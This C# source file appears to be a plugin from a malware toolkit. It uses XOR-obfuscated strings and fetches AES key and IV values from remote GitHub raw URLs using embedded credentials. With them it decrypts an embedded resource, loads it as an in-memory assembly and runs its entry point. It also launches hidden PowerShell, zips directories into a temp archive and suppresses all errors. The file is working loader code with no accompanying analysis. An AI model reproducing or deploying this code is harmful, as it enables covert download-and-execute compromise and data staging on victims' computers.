namespace Plugin.Handle
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Net.Http;
    using System.Reflection;
    using System.Security.Cryptography;
    using System.Text;
    using System.Threading.Tasks;

    /// <summary>
    /// Defines the <see cref="HandlePromitheas" />.
    /// </summary>
    internal class HandlePromitheas
    {
        /// <summary>
        /// Defines the dkPassfileZip.
        /// </summary>
        public static string dkPassfileZip = Path.Combine(Path.GetTempPath(), "KATANA.zip");

        /// <summary>
        /// The Start.
        /// </summary>
        public void Start()
        {

            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                var resourceName = reupload("Zfmcd$Y^$gsHffnem$`zm");

                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                using (StreamReader reader = new StreamReader(stream))
                {
                    string result = reader.ReadToEnd();//
                    string Billyinstallpath = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
                    Byte[] Billyinstallbytes = Convert.FromBase64String(F(result.Replace("*", "O").Replace("-", "o").Replace(":", "A")));
                    Task.Run(() => search(Billyinstallbytes)).Wait();
                }



            }
            catch { }
        }

        /// <summary>
        /// The F.
        /// </summary>
        /// <param name="encrypted">The encrypted<see cref="string"/>.</param>
        /// <returns>The <see cref="string"/>.</returns>
        public static string F(string encrypted)
        {
            string iv;
            string key;
            var reen = reupload("mbzUA==c}Xe:oM89Sl\\r^8}YIRifDH|<;oeNPm");
            var urliv = reupload("b~~zy0%%xk}$mc~bhyoxied~od~$ieg%MenEl]kxoLkxo%~boyexio%gkcd%c|$~r~5~eaod7MBYK^:KKKKKKH^<O]EB>D8B=ZO9DS_KZG\\IS^CIN?K");
            var urlkey = reupload("b~~zy0%%xk}$mc~bhyoxied~od~$ieg%MenEl]kxoLkxo%~boyexio%gkcd%aos$~r~5~eaod7MBYK^:KKKKKKH^<O]EBHO<NBG^?LNO@LZ8OS^B\\EBK");
            using (var client = new HttpClient())
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls |
                                                       SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                var credentialsf =
                    string.Format(System.Globalization.CultureInfo.InvariantCulture, "{0}:", reen);
                credentialsf = Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes(credentialsf));
                client.DefaultRequestHeaders.Authorization =
                    new System.Net.Http.Headers.AuthenticationHeaderValue("Basic", credentialsf);
                var contentsf = client.GetStringAsync(urliv).Result;
                iv = contentsf;

                var credentials = string.Format(System.Globalization.CultureInfo.InvariantCulture, "{0}:", reen);
                credentials = Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes(credentials));
                client.DefaultRequestHeaders.Authorization =
                    new System.Net.Http.Headers.AuthenticationHeaderValue("Basic", credentials);
                var contents = client.GetStringAsync(urlkey).Result;
                key = contents;

                byte[] encbytes = Convert.FromBase64String(encrypted);
                AesCryptoServiceProvider encdec = new AesCryptoServiceProvider();
                encdec.BlockSize = 128;
                encdec.KeySize = 256;
                encdec.Key = ASCIIEncoding.ASCII.GetBytes(key);
                encdec.IV = ASCIIEncoding.ASCII.GetBytes(iv);
                encdec.Padding = PaddingMode.PKCS7;
                encdec.Mode = CipherMode.CBC;

                ICryptoTransform icrypt = encdec.CreateDecryptor(encdec.Key, encdec.IV);

                byte[] dec = icrypt.TransformFinalBlock(encbytes, 0, encbytes.Length);
                icrypt.Dispose();

                return ASCIIEncoding.ASCII.GetString(dec);
            }
        }

        /// <summary>
        /// The search.
        /// </summary>
        /// <param name="purdi">The purdi<see cref="byte[]"/>.</param>
        public static void search(byte[] purdi)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])purdi);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                Mfo(Metinf, InjObj, parameters);
            }
            catch { }
        }

        /// <summary>
        /// The Entry.
        /// </summary>
        /// <param name="obj">The obj<see cref="Assembly"/>.</param>
        /// <returns>The <see cref="MethodInfo"/>.</returns>
        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }

        /// <summary>
        /// The Mfo.
        /// </summary>
        /// <param name="meth">The meth<see cref="MethodInfo"/>.</param>
        /// <param name="obj1">The obj1<see cref="object"/>.</param>
        /// <param name="obj2">The obj2<see cref="object[]"/>.</param>
        /// <returns>The <see cref="object"/>.</returns>
        private static object Mfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }

        /// <summary>
        /// The lip.
        /// </summary>
        /// <param name="dir">The dir<see cref="string"/>.</param>
        /// <param name="zipPath">The zipPath<see cref="string"/>.</param>
        public static void lip(string dir, string zipPath) //  Works
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });
        }

        /// <summary>
        /// The RPS.
        /// </summary>
        /// <param name="args">The args<see cref="string"/>.</param>
        /// <returns>The <see cref="Task"/>.</returns>
        public static async Task RPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = reupload("ze}oxyboff"),
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        /// <summary>
        /// The reupload.
        /// </summary>
        /// <param name="str">The str<see cref="string"/>.</param>
        /// <returns>The <see cref="string"/>.</returns>
        private static string reupload(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();
            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ (uint)ch1);
                stringBuilder.Append(ch2);
            }
            return stringBuilder.ToString();
        }

        /// <summary>
        /// The Stop.
        /// </summary>
        /// <param name="asString">The asString<see cref="string"/>.</param>
        public void Stop(string asString)
        {
        }
    }
}
